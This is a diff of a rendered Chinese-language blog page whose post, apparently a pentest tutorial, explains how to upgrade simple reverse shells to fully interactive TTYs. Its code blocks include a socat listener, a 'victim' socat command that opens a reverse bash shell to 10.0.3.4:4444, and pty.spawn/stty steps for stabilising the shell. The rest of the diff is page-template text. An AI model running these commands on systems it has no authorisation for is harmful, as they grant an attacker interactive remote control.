-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Listener:</span></span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"></span><br><span class="line"><span class="comment">#Victim:</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="I0xpc3RlbmVyOgpzb2NhdCBmaWxlOmB0dHlgLHJhdyxlY2hvPTAgdGNwLWxpc3Rlbjo0NDQ0CgojVmljdGltOgpzb2NhdCBleGVjOidiYXNoIC1saScscHR5LHN0ZGVycixzZXRzaWQsc2lnaW50LHNhbmUgdGNwOjEwLjAuMy40OjQ0NDQgIAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Listener:</span></span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"></span><br><span class="line"><span class="comment">#Victim:</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  </span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>使用样式选项</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ <span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ <span class="built_in">stty</span> rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="IyBJbiByZXZlcnNlIHNoZWxsCiQgcHl0aG9uIC1jICdpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJwpDdHJsLVoKCiMgSW4gS2FsaQokIHN0dHkgcmF3IC1lY2hvCiQgZmcKCiMgSW4gcmV2ZXJzZSBzaGVsbAokIHJlc2V0CiQgZXhwb3J0IFNIRUxMPWJhc2gKJCBleHBvcnQgVEVSTT14dGVybS0yNTZjb2xvcgokIHN0dHkgcm93cyA8bnVtPiBjb2x1bW5zIDxjb2xzPgo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ <span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ <span class="built_in">stty</span> rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>
 
 <p>Enjoy!</p>
 
@@ -455,16 +447,16 @@
           <div class="reward-container">
   <div>Buy me a coffee</div>
   <button>
-    Donate
+    赞赏
   </button>
   <div class="post-reward">
       <div>
-        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
-        <span>WeChat Pay</span>
+        <img src="/images/wechatpay.png" alt="253 微信">
+        <span>微信</span>
       </div>
       <div>
-        <img src="/images/alipay.png" alt="253 Alipay">
-        <span>Alipay</span>
+        <img src="/images/alipay.png" alt="253 支付宝">
+        <span>支付宝</span>
       </div>
 
   </div>
@@ -475,20 +467,20 @@
 <div class="post-copyright">
 <ul>
   <li class="post-copyright-author">
-      <strong>Post author:  </strong>253
+      <strong>本文作者： </strong>253
   </li>
   <li class="post-copyright-link">
-      <strong>Post link: </strong>
+      <strong>本文链接：</strong>
       <a href="https://lucifer11.xyz/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/" title="将simpleshell提升为全交互式的TTYshell">https://lucifer11.xyz/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
   </li>
 </ul>
 </div>
 
           <div class="followme">
-  <span>Welcome to my other publishing channels</span>
+  <span>欢迎关注我的其它发布渠道</span>
 
   <div class="social-list">
 
@@ -547,17 +539,18 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> linux提权</a>
-              <a href="/tags/reverse-tty-shell/" rel="tag"><i class="fa fa-tag"></i> reverse tty shell</a>
-              <a href="/tags/pentest/" rel="tag"><i class="fa fa-tag"></i> pentest</a>
+              <a href="/tags/Shell/" rel="tag"><i class="fa fa-tag"></i> Shell</a>
+              <a href="/tags/PTY/" rel="tag"><i class="fa fa-tag"></i> PTY</a>
+              <a href="/tags/socat/" rel="tag"><i class="fa fa-tag"></i> socat</a>
+              <a href="/tags/%E7%BB%88%E7%AB%AF/" rel="tag"><i class="fa fa-tag"></i> 终端</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/01/13/WinterMute-1/" rel="prev" title="vulnhub靶机渗透[WinterMute-1]">
-                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[WinterMute-1]
+                <a href="/2019/12/11/windowspy23/" rel="prev" title="windows同时安装python2和python3">
+                  <i class="fa fa-chevron-left"></i> windows同时安装python2和python3
                 </a>
             </div>
             <div class="post-nav-item">
@@ -595,15 +588,15 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-      <span>Word count total: </span>
-    <span title="Word count total">666k</span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">696k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-      <span>Reading time total &asymp;</span>
-    <span title="Reading time total">40:23</span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42:11</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -611,7 +604,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="Total Visitors">
+      <span class="site-uv" title="总访客量">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -619,12 +612,12 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="Total Views">
+      <span class="site-pv" title="总访问量">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
 </div>
-  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
   </div>
 
     </div>
